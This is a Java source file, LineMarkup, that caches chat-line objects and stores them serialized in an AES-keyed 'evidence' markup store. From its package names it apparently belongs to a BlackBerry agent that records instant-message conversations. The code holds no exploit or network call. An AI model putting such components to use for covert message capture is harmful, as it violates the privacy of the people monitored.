package blackberry.agent.im;

import java.util.Hashtable;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.DictMarkup;

public class LineMarkup extends DictMarkup {

    //#ifdef DEBUG
    private static Debug debug = new Debug("LineMarkup", DebugLevel.VERBOSE);
    //#endif
    
    Hashtable lineHash = new Hashtable();

    public LineMarkup(int agentId, byte[] aesKey) {
        super(agentId, aesKey);
    }

    public synchronized boolean put(String key, Line line) {
 
        Object last = lineHash.put(key, line);
        if(!line.equals(last)){
            //#ifdef DEBUG
            debug.trace("put: serialize");
            //#endif
            return put(key, line.serialize());
        }
        return true;
        
    }

    public synchronized Line getLine(String key) {

        if (lineHash.contains(key)) {
            return (Line) lineHash.get(key);
        }

        byte[] data = get(key);
        Line line = null;
        if (data != null) {
            line = Line.unserialize(data);
        }

        return line;

    }

}
